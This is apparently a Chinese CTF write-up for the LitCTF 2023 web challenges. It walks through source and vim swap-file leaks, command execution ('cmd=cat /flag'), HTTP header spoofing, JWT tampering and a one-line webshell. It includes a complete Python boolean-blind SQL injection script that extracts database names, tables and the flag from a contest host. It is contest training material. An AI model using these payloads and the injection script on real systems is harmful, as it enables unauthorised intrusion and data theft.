---
title: LitCTF
date: 2023-06-05 21:00:00
tags:
- web
categories:
- [比赛]
---

# 我Flag呢？

f12获取flag

![image-20230513120448243](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120448243.png)

### 第一个彩蛋

![image-20230513120617445](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120617445.png)



# Follow me and hack me

按照要求传参即可

![image-20230513120829093](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513120829093.png)

### 第三个彩蛋

上述有提示备份文件，我们进行扫描发现其`www.zip`源码泄露获得第二个彩蛋

发现有一段代码

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTF Challenge</title>
</head>
<body>
    <?php
    include 'flag.php';
    if (!isset($_GET['CTF']) || $_GET['CTF'] !== 'Lit2023') {
        echo "你知道 GET 么，试试用GET传参一个变量名为CTF 值为Lit2023";
    } else {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['Challenge']) || $_POST['Challenge'] !== "i'm_c0m1ng") {
            echo "下面试试POST，尝试用POST传输一个变量名为Challenge 值为 i'm_c0m1ng";
        } else {
            if (!isset($_COOKIE['flag'])) {
                echo "你看到了我的夹心饼干(Cookies)了么，里面就是flag哦~";
            } else {
                echo $Flag;
            }
        }
    }
    ?>
    <?php
        // 第三个彩蛋！(看过头号玩家么？)
        // _R3ady_Pl4yer_000ne_ (3/?)
    ?>
</body>
</html>
```



# Ping

我们进行一个简单的测试发现有弹窗组织，f12查看源代码	

![image-20230513122733566](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513122733566.png)

我们抓包在执行

![image-20230514214217119](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514214217119.png)

再次执行读取flag

![image-20230514214328761](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514214328761.png)

# 导弹迷踪

直接结束游戏，发现没有数据交互直接进js里找flag

![image-20230513123818729](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513123818729.png)



# PHP是世界上最好的语言！！

一个在线编译平台，发现其可以进行命令执行直接读取flag

![image-20230513124457994](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513124457994.png)



# Vim yyds

vim缓存泄露访问`/.index.php.swp`将缓存文件下载，然后读取

```shell
vim -r index.php.swp
```

![image-20230513154901063](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513154901063.png)

按照要求传参获取flag

```uri
password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=cat /flag
```





# 作业管理系统

前台登录密码：admin admin

进入后台发现有许多功能点

![image-20230514213402439](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514213402439.png)

![image-20230514213541931](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514213541931.png)

然后写一个一句话木马，蚁剑连接获取flag



## 第二个彩蛋

访问`https://github.com/Probiusofficial/My_pic/blob/main/demo.jpg`获取

![image-20230514223308691](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514223308691.png)



# 这是什么？SQL ！注一下 

经过测试发现其有两个字段

![image-20230513162206317](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513162206317.png)

查数据库，查表名，查列明最后读取flag,脚本如下

```python
import sys
import time
import requests
url = "http://node6.anna.nssctf.cn:28822/?id="
flag = ""

for i in range(1,1000):
    max = 127
    min = 32
    while 1:
        mid = (max+min)>>1
        if(min == mid):
            flag += chr(mid)
            print(flag)
            break
        # payload = "1*(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))<{})#".format(i,mid)
        # payload = "1*(ascii(substr((select database()),{},1))<{})#".format(i,mid)
        # payload = "1*(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctftraining'),{},1))<{})#".format(i, mid)
        # payload = "1*(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctftraining' and table_name='news'),{},1))<{})#".format(i, mid)
        payload = "1*(ascii(substr((select flag from ctftraining.flag),{},1))<{})#".format(i, mid)
        res = requests.get(url = url+payload)

        # print(res.text)
        # print(res)
        if res.text.find("OHHHHHHH")>0:
            max = mid
        else:
            min = mid
```



## 第四个彩蛋

![image-20230513161802063](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230513161802063.png)



# Http pro max plus

第一步：本地访问（这里无法使用XFF）我们 使用`Client-ip: 127.0.0.1`

第二步：需要我们从` pornhub.com`跳转==》`Referer: pornhub.com`

第三步：要求谷歌访问更改UA头==》Chrome

第四步：代理设置==》Via: Clash.win

![image-20230514214844241](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514214844241.png)

然后f12查看提示

![image-20230514215043437](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514215043437.png)

访问获取flag



# 1zjs

小游戏看一下有无交互

![image-20230514215520052](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514215520052.png)

看一下里面的js文件

![image-20230514215827614](C:\Users\ROG-PC\AppData\Roaming\Typora\typora-user-images\image-20230514215827614.png)

访问一下康康

![image-20230514220012317](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514220012317.png)



# 就当无事发生

信息泄露,根据提示在GitHub上搭建的站点，直接在github上搜索title

![image-20230514220529050](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514220529050.png)

2023翻阅发现flag

![image-20230514221224312](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514221224312.png)



# Flag点击就送！

随便输入一个用户名（flag）,点击拿flag，发现了jwt令牌，弄下来看name是我们输入的用户名，改成admin即可

![image-20230514222657646](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514222657646.png)

将改好的jwt重新发包获取flag

![image-20230514222454672](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230514222454672.png)
